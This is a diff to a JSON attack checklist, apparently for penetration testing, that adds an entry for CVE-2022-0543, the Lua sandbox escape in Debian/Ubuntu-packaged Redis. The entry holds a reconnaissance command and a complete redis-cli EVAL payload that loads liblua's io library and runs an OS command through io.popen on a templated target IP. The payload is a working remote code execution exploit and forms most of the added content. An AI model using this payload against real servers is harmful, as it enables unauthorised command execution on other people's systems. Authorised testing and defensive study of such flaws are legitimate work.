@@ -59,6 +59,20 @@
           ]
         }
       ]
+    },
+    {
+      "category": "4. RCE via Lua Sandbox Escape",
+      "tasks": [
+        {
+          "id": "redis_lua_sandbox_escape",
+          "title": "CVE-2022-0543 (Debian/Ubuntu Lua Sandbox Escape)",
+          "description": "Debian/Ubuntu-packaged Redis (not upstream) ships with a Lua library path that lets EVAL scripts escape the sandbox entirely and run arbitrary OS commands — no MODULE LOAD or SSH key write needed. Distro-specific packaging bug, not a Redis core issue, so check the OS first.",
+          "commands": [
+            "redis-cli -h {target_ip} INFO server",
+            "redis-cli -h {target_ip} EVAL 'local io_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\", \"luaopen_io\"); local io = io_l(); local f = io.popen(\"id\", \"r\"); local res = f:read(\"*a\"); f:close(); return res' 0"
+          ]
+        }
+      ]
     }
   ]
 }
